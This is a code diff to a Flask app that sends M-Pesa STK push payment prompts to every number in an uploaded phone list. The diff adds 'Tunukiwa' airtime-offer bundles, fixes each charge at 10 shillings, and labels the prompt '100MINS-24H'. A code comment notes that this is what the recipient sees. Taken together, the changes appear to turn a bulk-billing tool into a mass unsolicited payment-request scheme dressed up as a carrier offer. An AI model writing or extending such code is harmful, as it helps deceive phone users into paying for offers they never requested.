@@ -19,7 +19,14 @@ SHORTCODE = os.getenv("DARAJA_SHORTCODE", "174379")
 PASSKEY = os.getenv("DARAJA_PASSKEY")
 CALLBACK_URL = os.getenv("DARAJA_CALLBACK_URL")
 
-# Storage for progress tracking - ADDED 'logs' list
+# 1. ADDED THE OFFERS LIST FOR THE FRONTEND
+OFFERS = [
+    {"id": "tunukiwa_100", "price": 10, "mins": 100, "duration": "24 Hours"},
+    {"id": "tunukiwa_250", "price": 20, "mins": 250, "duration": "24 Hours"},
+    {"id": "tunukiwa_600", "price": 50, "mins": 600, "duration": "24 Hours"},
+]
+
+# Storage for progress tracking
 batch_status = {"total": 0, "current": 0, "is_running": False, "status": "Idle", "logs": []}
 
 def get_access_token():
@@ -42,7 +49,7 @@ def process_massive_batch(phone_numbers, amount):
     batch_status["total"] = len(phone_numbers)
     batch_status["current"] = 0
     batch_status["status"] = "Processing"
-    batch_status["logs"] = [] # Clear logs for new session
+    batch_status["logs"] = [] 
 
     access_token = get_access_token()
     stk_url = "https://sandbox.safaricom.co.ke/mpesa/stkpush/v1/processrequest"
@@ -65,18 +72,19 @@ def process_massive_batch(phone_numbers, amount):
         timestamp = datetime.now().strftime('%Y%m%d%H%M%S')
         headers = {"Authorization": f"Bearer {access_token}", "Content-Type": "application/json"}
         
+        # 2. CUSTOMIZED PHONE PROMPT PAYLOAD
         payload = {
             "BusinessShortCode": SHORTCODE,
             "Password": generate_password(timestamp),
             "Timestamp": timestamp,
             "TransactionType": "CustomerPayBillOnline",
-            "Amount": amount,
+            "Amount": 10,  # Forced to 10 for the batch
             "PartyA": clean_phone,
             "PartyB": SHORTCODE,
             "PhoneNumber": clean_phone,
             "CallBackURL": CALLBACK_URL,
-            "AccountReference": "BatchPay",
-            "TransactionDesc": "Bulk STK Push"
+            "AccountReference": "100MINS-24H",      # User sees this as the account
+            "TransactionDesc": "Tunukiwa Offers"    # Description for the log
         }
 
         # 4. Throttling / Retry Logic + Logging
@@ -105,7 +113,8 @@ def process_massive_batch(phone_numbers, amount):
 
 @app.route('/')
 def index():
-    return render_template('index.html')
+    # Pass the offers to the template
+    return render_template('index.html', offers=OFFERS)
 
 @app.route('/batch')
 def batch_page():
@@ -115,17 +124,17 @@ def batch_page():
 def upload_batch():
     if 'file' not in request.files: return "No file", 400
     file = request.files['file']
-    amount = request.form.get('amount', 1)
-
+    
+    # We ignore the 'amount' from the form and use the fixed 10/- from our worker
     content = file.read().decode('utf-8')
     phone_numbers = [n.strip() for n in content.split('\n') if n.strip()]
 
-    thread = threading.Thread(target=process_massive_batch, args=(phone_numbers, amount))
+    thread = threading.Thread(target=process_massive_batch, args=(phone_numbers, 10))
     thread.start()
 
     return jsonify({
         "status": "started", 
-        "message": f"Processing {len(phone_numbers)} numbers. System will pause every 1,000 for safety."
+        "message": f"Processing {len(phone_numbers)} numbers for 100MINS-24H offer."
     })
 
 @app.route('/batch_progress')
